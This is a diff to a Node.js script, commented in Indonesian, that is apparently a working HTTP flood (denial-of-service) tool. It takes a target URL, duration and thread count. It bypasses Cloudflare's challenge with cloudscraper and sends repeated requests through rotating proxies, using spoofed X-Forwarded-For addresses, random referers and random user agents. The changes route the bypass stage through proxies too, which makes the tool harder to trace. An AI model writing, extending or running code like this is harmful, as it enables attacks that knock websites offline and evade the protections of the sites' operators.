@@ -1,14 +1,14 @@
 const cloudscraper = require('cloudscraper');
 const request = require('request');
 const args = process.argv.slice(2);
-const fs = require('fs'); // Import modul 'fs' untuk membaca file
+const fs = require('fs'); 
 
 // Tidak melakukan apa-apa pada uncaughtException dan unhandledRejection
 process.on('uncaughtException', (err) => { /* Kosong */ });
 process.on('unhandledRejection', (reason, promise) => { /* Kosong */ });
 
 if (process.argv.length <= 2) {
-    // Pesan penggunaan, contoh, dan peringatan dihapus
+    console.log(`Penggunaan: node cf.js <URL> <Waktu_Detik> [Threads_Opsional, default: 1]`);
     process.exit(-1);
 }
 
@@ -39,24 +39,25 @@ let proxies = [];
 const PROXY_FILE = 'proxies.txt';
 if (!fs.existsSync(PROXY_FILE)) {
     console.error(`[ERROR] File proxy "${PROXY_FILE}" tidak ditemukan. Proxy wajib digunakan.`);
-    process.exit(1); // Keluar jika file proxy tidak ada
+    process.exit(1); 
 }
 
+// Membaca file proxies.txt (hanya berisi IP:Port)
 proxies = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);
 
 if (proxies.length === 0) {
     console.error(`[ERROR] File proxy "${PROXY_FILE}" kosong. Harap tambahkan proxy.`);
-    process.exit(1); // Keluar jika tidak ada proxy yang dimuat
+    process.exit(1);
 }
 
-console.log(`[Info] Loaded ${proxies.length} proxies.`); // Menampilkan "memuat baris"
+console.log(`[Info] Loaded ${proxies.length} proxies.`); 
 // --- LOGIKA WAJIB PROXY BERAKHIR ---
 
 
-// Menampilkan "memulai serangan"
 console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);
 
 const userAgents = [
+    // ... (list User Agents tetap sama) ...
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
@@ -78,18 +79,29 @@ const userAgents = [
 
 for (let i = 0; i < threads; i++) {
     const int = setInterval(() => {
-        cloudscraper.get(url, function (e, r, b) {
+        
+        // --- AMBIL PROXY ACAL DENGAN PROTOKOL HTTP:// ---
+        const selectedProxy = 'http://' + getRandomItem(proxies);
+        // ---
+
+        // 1. Tahap Bypass Cloudflare (mendapatkan cookie)
+        // Tambahkan opsi 'proxy' di sini agar cloudscraper menggunakan proxy
+        const cloudscraperOptions = {
+            url: url,
+            proxy: selectedProxy // BARU: Memaksa cloudscraper.get menggunakan proxy
+        };
+        
+        cloudscraper.get(cloudscraperOptions, function (e, r, b) {
             if (e) return;
-            // Perbaikan untuk menangani kemungkinan undefined sebelum mengakses properti bersarang
             if (!r || !r.request || !r.request.headers || !r.request.headers.request) {
                 return;
             }
 
             const cookie = r.request.headers.request.cookie;
             const useragent = getRandomItem(userAgents);
-
             const ip = rIp();
 
+            // 2. Tahap Pengiriman Request menggunakan Cookie
             const requestOptions = {
                 url: url,
                 headers: {
@@ -99,7 +111,7 @@ for (let i = 0; i < threads; i++) {
                     'cookie': cookie,
                     'Origin': 'http://' + rStr(8) + '.com',
                     'Referer': 'http://google.com/' + rStr(10),
-                    'X-Forwarded-For': ip,
+                    'X-Forwarded-For': ip, // Menyamarkan IP dengan IP acak, tetapi koneksi lewat proxy
                     'Connection': 'Keep-Alive',
                     'Cache-Control': 'no-cache',
                     'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
@@ -112,8 +124,10 @@ for (let i = 0; i < threads; i++) {
                 }
             };
 
-            // Menggunakan proxy yang dimuat (wajib)
-            requestOptions.proxy = getRandomItem(proxies);
+            // *** BAGIAN KRITIS UNTUK PROXY ***
+            // Pastikan request utama juga menggunakan proxy yang sama
+            requestOptions.proxy = selectedProxy; 
+            // ***
 
             request(requestOptions);
         });
